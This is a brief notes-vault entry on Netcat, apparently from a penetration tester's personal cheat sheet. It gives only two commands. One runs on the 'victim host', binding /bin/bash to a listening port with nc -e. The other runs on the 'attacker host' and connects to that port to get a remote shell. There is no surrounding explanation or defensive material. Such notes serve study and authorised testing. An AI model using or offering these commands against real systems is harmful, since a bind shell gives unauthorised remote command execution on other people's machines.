------

Using of [[Tools/Netcat|Netcat]]

-----------

# Netcat | nc

## Victim host

```bash
nc -nlvp 4646 -e /bin/bash
```

-------

### Attacker host

````bash
nc IPVICTIM 4646
````



-----
# Tags

#bindShell #nc #netcat #shell 

-----